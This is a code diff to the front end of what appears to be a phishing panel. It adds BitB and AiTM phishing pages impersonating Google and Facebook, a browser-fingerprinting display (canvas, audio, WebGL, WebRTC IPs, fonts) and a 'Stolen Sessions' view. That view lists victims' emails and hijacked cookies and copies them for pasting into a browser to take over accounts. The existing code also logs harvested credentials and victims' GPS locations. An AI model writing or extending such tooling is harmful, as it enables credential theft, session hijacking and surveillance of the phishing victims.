@@ -151,7 +151,7 @@ function updateTunnelUI(url, status) {
     if (url && status === 'connected') {
         banner.className = 'tunnel-banner connected';
         statusEl.innerHTML = `<i data-lucide="check-circle" style="width:18px;height:18px;color:var(--green)"></i><div><div style="color:var(--green);font-weight:600">Tunnel Connected</div><div class="tunnel-url">${url}</div></div>`;
-        const links = {fbLink:`${url}/phishing/facebook.html`,ggLink:`${url}/phishing/google.html`,prizeLink:`${url}/landing/prize.html`,secLink:`${url}/landing/security.html`,delivLink:`${url}/landing/delivery.html`};
+        const links = {fbLink:`${url}/phishing/facebook.html`,ggLink:`${url}/phishing/google.html`,bitbLink:`${url}/phishing/bitb-google.html`,aitmLink:`${url}/phishing/aitm-facebook.html`,prizeLink:`${url}/landing/prize.html`,secLink:`${url}/landing/security.html`,delivLink:`${url}/landing/delivery.html`};
         Object.entries(links).forEach(([id,link]) => { const el = document.getElementById(id); if (el) el.textContent = link; });
         lucide.createIcons({nodes: [banner]});
     } else if (status === 'failed') {
@@ -238,8 +238,8 @@ async function loadAllData() {
 function renderEntry(item, idx) {
     const time = new Date(item.time).toLocaleString('vi-VN');
     const isHarvest = item.type === 'harvest';
-    const pageLabel = {facebook:'Facebook',google:'Google',momo:'MoMo',zalo:'Zalo'}[item.page] || item.page;
-    const pageIconName = {facebook:'log-in',google:'mail',momo:'wallet',zalo:'message-circle'}[item.page] || 'globe';
+    const pageLabel = {facebook:'Facebook',google:'Google',bitb_google:'BitB Google',aitm_facebook:'AiTM Facebook',aitm_google:'AiTM Google',momo:'MoMo',zalo:'Zalo',landing_prize:'Landing Prize',landing_security:'Landing Security',landing_delivery:'Landing Delivery'}[item.page] || item.page;
+    const pageIconName = {facebook:'log-in',google:'mail',bitb_google:'app-window',aitm_facebook:'shield-off',aitm_google:'shield-off',momo:'wallet',zalo:'message-circle',landing_prize:'gift',landing_security:'shield-alert',landing_delivery:'package'}[item.page] || 'globe';
     const statusBadge = isHarvest ? '<span class="entry-badge harvest">Credentials</span>' : '<span class="entry-badge visit">Visit</span>';
     const delKey = encodeURIComponent(isHarvest ? item.harvest_time || item.time : item.fp_time || item.time);
     const delApi = isHarvest ? '/api/data/' : '/api/fingerprint/';
@@ -251,12 +251,22 @@ function renderEntry(item, idx) {
         let locHtml = loc.latitude ? `<div class="fp-row fp-row-wide"><span class="fp-icon"><i data-lucide="map-pin" style="width:14px;height:14px"></i></span><div><div class="fp-label">LOCATION ${loc.source==='GPS'?'(GPS)':'(IP)'}</div><div class="fp-value" style="color:var(--green)">${loc.latitude}, ${loc.longitude}</div><a href="${loc.google_maps}" target="_blank" class="fp-map-link"><i data-lucide="map" style="width:11px;height:11px;vertical-align:-2px"></i> Google Maps</a></div></div>` : '';
         const sk = Object.keys(social);
         const socialHtml = sk.map(n => { const s = social[n]; const st = s.likely_logged_in ? '<span style="color:var(--green)">Logged in</span>' : 'Unknown'; return R('user',n,st); }).join('');
+        // Advanced Fingerprint data
+        const adv = fp.advanced_fingerprint || {};
+        let advParts = [];
+        if (adv.canvas && adv.canvas.hash) advParts.push(R('image','Canvas FP',adv.canvas.hash));
+        if (adv.audio && adv.audio.hash) advParts.push(R('music','Audio FP',adv.audio.hash));
+        if (adv.webgl && adv.webgl.renderer) advParts.push(R('monitor','WebGL GPU',esc(adv.webgl.renderer)));
+        if (adv.webrtc_ips && adv.webrtc_ips.length) advParts.push(R('wifi','WebRTC IPs','<span style="color:var(--amber)">' + adv.webrtc_ips.join(', ') + '</span>'));
+        if (adv.fonts && adv.fonts.length) advParts.push(R('type','Fonts',adv.fonts.length + ' detected'));
+        const advHtml = advParts.join('');
         detailPanel = `<div class="detail-panel" id="detail-${idx}">
             <div class="detail-section"><div class="detail-section-title"><span class="rank-badge r1">NETWORK</span> Connection</div><div class="fp-grid">${R('globe','IP',fp.server_ip||'N/A')}${R('wifi','Connection',net.type||'N/A')}${loc.isp?R('radio','ISP',loc.isp):''}${loc.city?R('building-2','Region',[loc.city,loc.region,loc.country].filter(Boolean).join(', ')):''}</div></div>
             <div class="detail-section"><div class="detail-section-title"><span class="rank-badge r2">DEVICE</span> Information</div><div class="fp-grid">${R('smartphone','Device',esc(dev.device_name||'N/A'))}${R('monitor','OS',(dev.os||'')+' '+(dev.os_version||''))}${R('chrome','Browser',(dev.browser||'')+' v'+(dev.browser_version||''))}${R('maximize','Screen',(dev.screen_width||'?')+'x'+(dev.screen_height||'?'))}</div></div>
             <div class="detail-section"><div class="detail-section-title"><span class="rank-badge r3">BEHAVIOR</span> Context</div><div class="fp-grid">${R('clock','Opened',ctx.local_time||time)}${R('link','Source',ctx.referrer_source||'Direct')}${R('battery-charging','Battery',(bat.level||'N/A')+' '+(bat.charging||''))}</div></div>
             ${locHtml ? `<div class="detail-section"><div class="detail-section-title"><span class="rank-badge r1">LOCATION</span></div><div class="fp-grid">${locHtml}</div></div>` : ''}
             ${socialHtml ? `<div class="detail-section"><div class="detail-section-title"><span class="rank-badge r4">ACCOUNTS</span></div><div class="fp-grid">${socialHtml}</div></div>` : ''}
+            ${advHtml ? `<div class="detail-section"><div class="detail-section-title"><span class="rank-badge" style="background:rgba(168,85,247,.15);color:#a855f7">ADV.FP</span> Advanced Fingerprint</div><div class="fp-grid">${advHtml}</div></div>` : ''}
         </div>`;
     }
 
@@ -530,6 +540,78 @@ function copyLink(id) {
         lucide.createIcons({nodes:[btn]});
         setTimeout(() => { btn.innerHTML = o; btn.style.background = ''; lucide.createIcons({nodes:[btn]}); }, 1500);
     }).catch(() => { const el = document.createElement('textarea'); el.value = text; document.body.appendChild(el); el.select(); document.execCommand('copy'); document.body.removeChild(el); });
+}
+
+// ===== STOLEN SESSIONS (AiTM) =====
+async function loadStolenSessions() {
+    try {
+        const sessions = await fetch('/api/aitm/sessions').then(r => r.json());
+        const container = document.getElementById('stolenSessionsList');
+        const badge = document.getElementById('navBadgeSessions');
+        if (badge) badge.textContent = sessions.length;
+
+        if (!sessions.length) {
+            container.innerHTML = '<div style="text-align:center;padding:40px 20px;color:var(--text-secondary);"><div style="font-size:48px;margin-bottom:12px;">\uD83D\uDD12</div><p>Ch\u01B0a c\u00F3 session n\u00E0o b\u1ECB capture.</p><p style="font-size:12px;margin-top:8px;">S\u1EED d\u1EE5ng trang <strong>AiTM Facebook</strong> \u0111\u1EC3 b\u1EAFt \u0111\u1EA7u.</p></div>';
+            return;
+        }
+
+        container.innerHTML = sessions.map((s, i) => `
+            <div style="background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;border-left:3px solid ${s.status==='active'?'#ef4444':'#6b7280'}">
+                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+                    <div style="display:flex;align-items:center;gap:8px;">
+                        <div style="width:10px;height:10px;border-radius:50%;background:${s.status==='active'?'#ef4444':'#6b7280'};${s.status==='active'?'animation:pulse-dot 1s infinite;':''}"></div>
+                        <strong style="color:var(--text-primary);font-size:14px;">${esc(s.target)}</strong>
+                        <span style="background:rgba(239,68,68,.12);color:#ef4444;padding:2px 8px;border-radius:4px;font-size:10px;font-weight:600;">SESSION HIJACKED</span>
+                    </div>
+                    <span style="font-size:11px;color:var(--text-secondary);">${new Date(s.captured_at).toLocaleString('vi-VN')}</span>
+                </div>
+                <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:12px;">
+                    <div><span style="color:var(--text-secondary)">Email:</span> <strong style="color:var(--text-primary)">${esc(s.email)}</strong></div>
+                    <div><span style="color:var(--text-secondary)">Cookies:</span> <strong style="color:var(--amber)">${s.cookies_count} total, ${s.critical_cookies} critical</strong></div>
+                </div>
+                <div style="margin-top:10px;display:flex;gap:8px;">
+                    <button class="btn btn-ghost" style="font-size:11px;padding:4px 10px;" onclick="viewSessionCookies('${s.session_id}')"><i data-lucide="eye" style="width:12px;height:12px;vertical-align:-2px;"></i> View Cookies</button>
+                    <button class="btn btn-ghost" style="font-size:11px;padding:4px 10px;" onclick="copySessionCookies('${s.session_id}')"><i data-lucide="copy" style="width:12px;height:12px;vertical-align:-2px;"></i> Copy All</button>
+                    ${s.has_screenshot ? '<button class="btn btn-ghost" style="font-size:11px;padding:4px 10px;" onclick="viewScreenshot(\''+s.session_id+'\')"><i data-lucide="image" style="width:12px;height:12px;vertical-align:-2px;"></i> Screenshot</button>' : ''}
+                </div>
+                <div id="cookies-${s.session_id}" style="display:none;margin-top:12px;"></div>
+            </div>
+        `).join('');
+        lucide.createIcons();
+    } catch(e) { console.error('Failed to load stolen sessions:', e); }
+}
+
+async function viewSessionCookies(sessionId) {
+    const container = document.getElementById('cookies-' + sessionId);
+    if (!container) return;
+    if (container.style.display !== 'none') { container.style.display = 'none'; return; }
+    try {
+        const session = await fetch('/api/aitm/session/' + sessionId).then(r => r.json());
+        const cookies = session.important_cookies || [];
+        container.innerHTML = '<div style="background:var(--bg);border-radius:8px;padding:12px;font-family:monospace;font-size:11px;max-height:200px;overflow-y:auto;">' +
+            cookies.map(c => `<div style="margin-bottom:6px;"><span style="color:var(--amber);font-weight:600;">${esc(c.name)}</span>: <span style="color:var(--text-secondary);">${esc(c.value)}</span> <span style="font-size:9px;color:var(--text-secondary);">(${c.domain})</span></div>`).join('') +
+            '</div>';
+        container.style.display = 'block';
+    } catch(e) {}
+}
+
+async function copySessionCookies(sessionId) {
+    try {
+        const session = await fetch('/api/aitm/session/' + sessionId).then(r => r.json());
+        const cookieStr = session.full_cookies.map(c => `${c.name}=${c.value}`).join('; ');
+        await navigator.clipboard.writeText(cookieStr);
+        alert('Cookies copied! Paste in browser DevTools → Application → Cookies');
+    } catch(e) { alert('Failed to copy'); }
+}
+
+async function viewScreenshot(sessionId) {
+    try {
+        const session = await fetch('/api/aitm/session/' + sessionId).then(r => r.json());
+        if (session.screenshot) {
+            const w = window.open();
+            w.document.write('<img src="' + session.screenshot + '" style="max-width:100%;">');
+        }
+    } catch(e) {}
 }
 
 // ===== INIT =====
